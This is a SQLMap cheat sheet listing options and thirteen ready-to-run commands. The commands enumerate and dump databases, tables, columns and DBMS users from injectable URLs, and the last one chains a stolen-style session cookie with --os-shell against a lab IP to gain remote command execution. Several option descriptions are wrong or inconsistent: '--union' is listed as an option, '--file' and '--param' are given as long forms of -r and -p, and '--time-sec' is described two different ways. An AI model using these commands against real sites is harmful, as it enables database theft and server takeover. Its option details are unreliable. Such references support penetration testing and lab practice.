<Callout> SQLMap is a powerful tool used for detecting and exploiting SQL injection vulnerabilities in web applications. Cheat sheet covering various SQLMap commands, options, and examples </Callout>
## Table of Contents
- [Overview](#overview)
- [Basic Command Structure](#basic-command-structure)
- [Options](#options)
- [Detection and Enumeration](#detection-and-enumeration)
- [Data Extraction](#data-extraction)
- [Advanced Techniques](#advanced-techniques)
- [Examples](#examples)


### Basic Command Structure:
```bash
sqlmap [options]
```

### Options:
- `-u <URL>, --url=<URL>`: Target URL (e.g., http://example.com/page.php?id=1).
- `-r <RequestFile>, --file=<RequestFile>`: Load HTTP request from a file.
- `-p <Parameter>, --param=<Parameter>`: Inject into parameter (e.g., id).
- `--data=<Data>`: POST data to send.
- `--cookie=<Cookie>`: HTTP cookie header value.
- `--user-agent=<Agent>`: HTTP user agent header value.
- `--referer=<Referer>`: HTTP referer header value.
- `--headers=<Headers>`: Extra headers (e.g., "Header1: Value1\nHeader2: Value2").
- `--proxy=<Proxy>`: Use a proxy (e.g., "http://127.0.0.1:8080").
- `--random-agent`: Use a random HTTP user agent.
- `--level=<Level>`: Level of tests to perform (1-5, default: 1).
- `--risk=<Risk>`: Risk of tests to perform (1-3, default: 1).
- `--batch`: Run in batch mode (no user interaction).
- `--flush-session`: Flush session files for current target.
- `--technique=<Technique>`: SQL injection technique(s) to use (e.g., "U, T").
- `--string=<String>`: String to match when querying the database.
- `--time-sec=<Seconds>`: Seconds to wait before timeout (default: 5).

### Detection and Enumeration:
- `--dbs`: Enumerate databases.
- `--tables`: Enumerate tables in the selected database.
- `--columns`: Enumerate columns in the specified table.
- `--count`: Retrieve the number of entries for a given parameter.
- `--users`: Enumerate DBMS users.

### Data Extraction:
- `-D <Database>, --database=<Database>`: Database to enumerate.
- `-T <Table>, --table=<Table>`: Table to enumerate.
- `-C <Columns>, --columns=<Columns>`: Columns to retrieve.
- `--dump`: Dump the data from the specified table.

### Advanced Techniques:
- `--union`: Use SQL UNION query injection.
- `--time-sec=<Seconds>`: Seconds to delay between requests.
- `--comment=<Comment>`: Use specified comment string.
- `--no-cast`: Disable the usage of CAST() method.
- `--no-escape`: Turn off string escaping.

### Examples:
1. **Basic Scan:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --dump
```

2. **Using a Request File:**
```bash
sqlmap -r request.txt --batch --dump
```

3. **Enumerating Databases:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --dbs
```

4. **Dumping a Specific Database Table:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch -D dbname -T table_name --dump
```

5. **Using Different Injection Techniques:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --technique=U --time-sec=2 --dump
```

6. **Enumerating Columns in a Table:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch -D dbname -T table_name --columns
```

7. **Using a Proxy:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --proxy="http://127.0.0.1:8080" --batch --dump
```

8. **Extracting Specific Columns:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch -D dbname -T table_name -C "column1,column2" --dump
```

9. **Using Random User-Agent:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --random-agent --batch --dump
```

10. **Advanced Techniques with Delay:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --technique=U --time-sec=5 --dump
```

11. **Enumerating DBMS Users:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --users
```

12. **Disabling String Escaping:**
```bash
sqlmap -u "http://example.com/page.php?id=1" --batch --no-escape --dump
```
13. SQL + COOKIE + RCE
```
sqlmap --url "http://10.129.95.174/dashboard.php?search=Sandy" --cookie="PHPSESSID=k3499od0v96gt0vhs2nd32r6te" --batch --level=3 --risk=3 --random-agent --os-shell
```
